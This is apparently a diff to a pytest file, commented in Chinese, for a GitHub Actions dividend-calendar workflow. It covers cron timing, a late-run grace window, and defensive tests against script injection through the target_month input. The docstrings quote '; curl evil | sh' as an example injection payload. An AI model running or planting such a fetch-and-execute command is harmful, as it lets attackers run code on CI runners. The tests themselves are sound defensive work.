@@ -15,8 +15,12 @@
 
 **成因(這組測試存在的理由)**:workflow 2026-08-13 建立時是「1 號發本月」,
 2026-08-24 commit `2ec9819`(PR #705)把目標月改成**下個月**,**cron 沒有跟著改** →
-悄悄變成「1 號發下個月」;而且 8/1 workflow 還不存在、9/1 那次送的是 10 月,
-於是 **2026 年 9 月的行事曆永遠不會被自動送出**(只能靠 `target_month` 補送)。
+悄悄變成「1 號發下個月」,於是 **2026 年 9 月的行事曆永遠不會被自動送出**
+(舊設定的 9/1 送 10 月、新設定的 9/28 也送 10 月,兩條路徑都產不出 9 月;
+只能靠 `target_month` 補送)。
+⚠️ 上一句說的是「**設定會產生什麼結果**」,**不是**「某次排程執行送了什麼」——
+這條 workflow **至今一次排程都沒跑過**(2026-09-01 查 Actions API:6 次執行**全部**是
+`workflow_dispatch`、最早 2026-08-24,`event=schedule` 命中 **0**)。
 → 只改一邊不會有任何東西報錯,所以要用測試把 cron 字面值鎖住。
 
 ## 附帶守的三件事
@@ -60,7 +64,7 @@ def test_cron_is_28th_0023_utc():
     **28 號**:2 月沒有 29~31 號 → 固定 28 號才保證每月觸發**恰好一次**,
               不必再寫「今天是不是當月最後一天」的判斷(29/30/31 會讓 2 月整月漏發)。
     **分鐘 23**:GitHub 官方文件明列排程在**整點**為高負載時段,會延遲甚至直接丟棄 job;
-              本 repo 實測整點的 `update_macro_history.yml`,13 次觸發沒有一次在 62 分鐘內
+              本 repo 實測整點的 `update_macro_history.yml`,13 次觸發最快也要 61.9 分鐘才
               起跑(中位數 144 分鐘、最長 693 分鐘)。錯開整點。
     **配對**:28 號 ⇔ 推「下個月」(`scripts/dividend_calendar_notify.main`)。
               要改成 1 號,目標月必須同時改回「本月」,否則就是 user 否決的
@@ -106,19 +110,72 @@ def test_workflow_yaml_parses_and_declares_target_month():
     assert "YYYY-MM" in _inputs["target_month"]["description"]
 
 
-def test_target_month_never_interpolated_into_run_command():
-    """**安全**:user 可控的 target_month 不可用 `${{ }}` 插進 `run:` 指令列。
+# `${{ ... }}` 一個插值運算式(非貪婪,GitHub 的插值不可巢狀)。
+_INTERP_RE = re.compile(r"\$\{\{(.*?)\}\}", re.S)
+# 唯一允許的那一行:env 區塊裡把 input 綁成環境變數。
+_ENV_BIND_RE = re.compile(
+    r"^\s*TARGET_MONTH:\s*\$\{\{\s*github\.event\.inputs\.target_month\s*\}\}\s*$")
 
-    GitHub Actions 的 `${{ }}` 是在 shell 執行**之前**做字串代換 → 填
-    `; curl evil | sh` 之類就會被當指令跑(script injection)。正確做法是走 `env:`,
-    由 Python 讀 `os.environ`。(既有 dry_run 那條插值只產出固定字面值 `--dry-run` / `''`,
-    不含 user 輸入,不在此限。)
+
+def test_target_month_interpolation_appears_only_on_the_env_binding_line():
+    """**安全**(不需 pyyaml 的底線守衛):全檔提到 target_month 的插值**只准有那一行 env 綁定**。
+
+    GitHub Actions 的 `${{ }}` 是在 shell 執行**之前**做字串代換 → user 在
+    `target_month` 填 `; curl evil | sh` 之類就會被當指令跑(script injection)。
+    正確做法是走 `env:`,由 Python 讀 `os.environ`。
+
+    ⚠️ **為什麼要有這條「只准出現在那一行」的寫法**(v19.538 修的盲區):
+    舊版守衛是 `_t[_t.index("        run: >"):]` —— `str.index` 找的是**第一個** `run: >`,
+    而本 workflow 的**第一個** run 區塊是安裝 Chromium 那步的 `run: |`(不是 `run: >`),
+    於是切點落在檔案**後段**,前面所有 `run:` 全部在守衛的視線之外。
+    實測:把 `${{ github.event.inputs.target_month }}` 插進 Chromium 那步的 `run: |`
+    → **37 passed,完全沒抓到**。本條與下一條(逐 step 走訪)一起把那個盲區補掉。
+
+    本條刻意**不依賴 pyyaml**(它只是 pre-commit 的傳遞依賴,不在 requirements 裡)——
+    安全守衛不該因為某個環境少裝一個套件就**靜默 skip**。
     """
     _t = _workflow_text()
-    # run: 區塊(到下一個同縮排 key 或檔尾)
-    _run = _t[_t.index("        run: >"):]
-    assert "target_month" not in _run, "target_month 被插進 run: 指令列 → script injection"
-    assert "TARGET_MONTH: ${{ github.event.inputs.target_month }}" in _t, "應改走 env 傳遞"
+    _bad = []
+    for _ln, _line in enumerate(_t.splitlines(), start=1):
+        if not any("target_month" in _e.lower() for _e in _INTERP_RE.findall(_line)):
+            continue                       # 這行沒有提到 target_month 的插值
+        if _ENV_BIND_RE.match(_line):
+            continue                       # 唯一合法用法
+        _bad.append(f"{_ln}: {_line.strip()}")
+    assert not _bad, ("target_month 只准出現在 `TARGET_MONTH: ${{ ... }}` 那一行 env 綁定;"
+                      f"以下位置是 script injection 風險 → {_bad}")
+    # 反向:那一行必須真的還在(否則 Python 端永遠讀不到補送月份)
+    assert any(_ENV_BIND_RE.match(_l) for _l in _t.splitlines()), "應改走 env 傳遞"
+
+
+def test_no_step_in_any_job_interpolates_target_month_into_run():
+    """**安全**:走訪**所有 job 的所有 step**,`run:` 字串裡不得有提到 target_month 的插值。
+
+    這是上一條的結構化版本 —— 上一條用行掃描(不依賴 pyyaml、絕不 skip),
+    這一條真的把 YAML 解析開、逐 step 檢查 `run`,兩條一起才不會再出現
+    「切點只切到某一個 run 區塊」那種盲區。
+
+    ⚠️ 檢查的是**插值運算式內部**是否提到 target_month(大小寫不分,故 `${{ env.TARGET_MONTH }}`
+    同樣會被抓)。純文字出現 `target_month`(例如 shell 註解)不算 —— 沒有插值就沒有代換,
+    也就沒有 injection。
+    """
+    yaml = pytest.importorskip("yaml")           # pyyaml 為 pre-commit 傳遞依賴,缺則略過
+    doc = yaml.safe_load(_workflow_text())
+    _steps = [(_jn, _i, _st)
+              for _jn, _job in (doc.get("jobs") or {}).items()
+              for _i, _st in enumerate(_job.get("steps") or [])]
+    assert _steps, "解析不到任何 step → 這條測試等於沒在守,先修解析"
+    _bad = []
+    for _jn, _i, _st in _steps:
+        _run = _st.get("run")
+        if not isinstance(_run, str):
+            continue
+        for _expr in _INTERP_RE.findall(_run):
+            if "target_month" in _expr.lower():
+                _bad.append(f"job={_jn} step#{_i}({_st.get('name') or _st.get('uses')}): "
+                            f"${{{{{_expr}}}}}")
+    assert not _bad, ("user 可控的 target_month 被插進 run: 指令列 → script injection;"
+                      f"改走 env: 由 Python 讀 os.environ → {_bad}")
 
 
 # ══════════════════════════════════════════════════════════════════════
@@ -139,6 +196,52 @@ def test_unspecified_december_rolls_to_next_year():
 
 def test_unspecified_february_28_gives_march():
     assert M._resolve_target_month(_now(2026, 2, 28), None) == (2026, 3)
+
+
+# ── v19.538 B-4:排程遲到跨月 → 2 月整月無聲跳過 ──────────────────────────
+# `_now_tw()` 取的是**任務實際起跑時刻**,不是排程時刻。cron 28 號 08:23 台灣,
+# 延遲 > 937 分就跨過台灣午夜;非閏年 2/28 是月底 → `now` 變 3/1 → 「下個月」= 4 月,
+# **3 月整月無聲跳過**。實測本 repo 排程延遲(update_macro_history,13 次)最長 692.8 分,
+# 餘裕僅 244 分。修法:未指定月份且 `now.day <= _LATE_RUN_GRACE_DAYS` → 視為遲到 → 本月。
+
+
+def test_late_february_run_does_not_skip_march():
+    """**這一組是 B-4 的核心**:2027-02-28 那一跑遲到跨月,目標仍須是 3 月(不是 4 月)。"""
+    assert M._resolve_target_month(_now(2027, 2, 28), None) == (2027, 3)     # 準時
+    assert M._resolve_target_month(_now(2027, 3, 1), None) == (2027, 3)      # 遲到 → 同一個月
+
+
+def test_late_december_run_keeps_january_and_the_year():
+    """12/28 遲到到 1/1:目標仍是 1 月、且年份要跟著跨(不是回到去年 1 月)。"""
+    assert M._resolve_target_month(_now(2026, 12, 28), None) == (2027, 1)    # 準時
+    assert M._resolve_target_month(_now(2027, 1, 1), None) == (2027, 1)      # 遲到
+
+
+@pytest.mark.parametrize("day", [1, 2, 3])
+def test_days_inside_the_grace_window_target_this_month(day):
+    """1~3 號未指定月份 → **本月**(= user 允許的「月初發本月」,不是被否決的「月初發下個月」)。"""
+    assert M._resolve_target_month(_now(2026, 9, day), None) == (2026, 9)
+
+
+@pytest.mark.parametrize("day", [4, 15, 27, 28, 29, 30])
+def test_days_outside_the_grace_window_still_target_next_month(day):
+    """**寬限窗不可外溢**:4 號以後(含 28 號準時那一跑)行為一個字都沒變 → 下個月。"""
+    assert M._resolve_target_month(_now(2026, 9, day), None) == (2026, 10)
+
+
+def test_grace_window_never_applies_when_month_is_specified():
+    """明填 `target_month` → `now` 完全不參與,寬限窗不得插手(補送才可靠)。"""
+    for _d in (1, 2, 3, 15, 28):
+        assert M._resolve_target_month(_now(2026, 9, _d), "2026-11") == (2026, 11)
+
+
+def test_grace_window_constant_is_small_enough_to_be_unreachable_by_a_real_delay():
+    """常數本身的漂移鎖:寬限窗只准涵蓋「28 號那一跑遲到」,不准大到吃掉正常的月中觸發。
+
+    落到 1 號需延遲 > 937 分、2 號 > 2377 分、3 號 > 3817 分(本 repo 實測最長 692.8 分)。
+    若有人把它調到 ≥ 28,28 號準時那一跑會被判成「遲到」→ 永遠送本月 → 整個功能反向。
+    """
+    assert 1 <= M._LATE_RUN_GRACE_DAYS <= 5
 
 
 @pytest.mark.parametrize("raw,want", [("2026-09", (2026, 9)), ("2027-01", (2027, 1)),
@@ -278,3 +381,66 @@ def test_cli_end_to_end_nonzero_exit():
                         cwd=str(_ROOT), capture_output=True, text=True, timeout=180)
     assert _p.returncode != 0, _p.stdout
     assert "2026-13" in _p.stderr and "target_month" in _p.stderr
+
+
+# ══════════════════════════════════════════════════════════════════════
+# 5. v19.538:target_month 補送 × §16.2 事實優先(`actual_ex_for_month`)的交互
+#    `06c7093` 讓 `build_month_calendar` 在目標月**已有實際紀錄**時直接顯示事實。
+#    排程路徑(推下個月)踩不到 —— 未來月份不會有紀錄;**補送過去月份幾乎必然踩到**。
+#    這裡把「兩條路徑各自會發生什麼」鎖住,避免下次有人改動任一邊時無聲翻面。
+# ══════════════════════════════════════════════════════════════════════
+def _monthly_history(last_y: int, last_m: int, day: int = 11, n: int = 14) -> list:
+    """n 筆月配紀錄,最後一筆落在 (last_y, last_m)。基準日一律套營業日校正。"""
+    from services.dividend_calendar import roll_to_business_day
+    _y, _m, out = last_y, last_m, []
+    for _ in range(n):
+        _ex = roll_to_business_day(_dt.date(_y, _m, day))
+        out.append({"date": _ex.isoformat(),
+                    "pay_date": (_ex + _dt.timedelta(days=8)).isoformat()})
+        _m -= 1
+        if _m == 0:
+            _m, _y = 12, _y - 1
+    return list(reversed(out))
+
+
+def _one_event(year: int, month: int, hist: list) -> dict:
+    from services.dividend_calendar import build_month_calendar
+    _cal = build_month_calendar(
+        [{"code": "AAA", "name": "測試月配", "house": "安聯", "dividends": hist}],
+        year, month, ref_year=2026, ref_month=9, ref_day=1)
+    assert len(_cal["events"]) == 1, _cal["counts"]
+    return _cal["events"][0]
+
+
+def test_scheduled_path_next_month_is_always_an_estimate_not_a_fact():
+    """排程路徑(推**下個月**):目標月不可能已有紀錄 → 一律 `is_actual=False`。"""
+    _hist = _monthly_history(2026, 8)                 # 歷史到 2026-08 為止
+    _ev = _one_event(2026, 10, _hist)                 # 9/28 那一跑推 10 月
+    assert _ev["is_actual"] is False, "未來月份不該有『事實』"
+    assert _ev["error_band"] is not None               # 推估才有誤差帶
+
+
+def test_backfilling_a_past_month_shows_the_fact_not_the_estimate():
+    """補送**過去**月份:該月已有紀錄 → 顯示事實(`is_actual=True` / 信心 high / 誤差 0)。
+
+    ⚠️ 這是 §1 要的行為(手上有事實就不該顯示猜測),**但**畫面上目前分不出事實與推估
+    —— 全域「推估」徽章對事實格而言是錯的。那是 `06c7093` 已登記、待 UI 線框拍板的接縫。
+    本測只鎖**資料層**確實走了事實分支;若哪天 L3 開始讀 `is_actual`,守衛在
+    `test_dividend_anchor_v19527.py::test_is_actual_flag_is_present_on_both_branches_and_unread_by_render`。
+    """
+    _hist = _monthly_history(2026, 8)
+    _ev = _one_event(2026, 8, _hist)                  # 於 2026-09-01 補送 2026-08
+    assert _ev["is_actual"] is True
+    assert _ev["confidence"] == "high"
+    assert _ev["error_band"] == 0
+    _last = _dt.date.fromisoformat(_hist[-1]["date"])
+    assert _ev["ex_date"] == _last, "事實分支必須用歷史那一筆的基準日,不是推估值"
+    assert _ev["pay_date_est"] == _dt.date.fromisoformat(_hist[-1]["pay_date"])
+
+
+def test_backfilling_a_month_with_no_record_still_falls_back_to_the_estimate():
+    """補送的月份**沒有**紀錄(例:9 月那次,歷史只到 8 月)→ 仍走推估,不是「無事件」。"""
+    _hist = _monthly_history(2026, 8)
+    _ev = _one_event(2026, 9, _hist)                  # user 的實際情境:2026-09-01 補送 9 月
+    assert _ev["is_actual"] is False
+    assert _ev["ex_date"].month == 9 and _ev["ex_date"].year == 2026
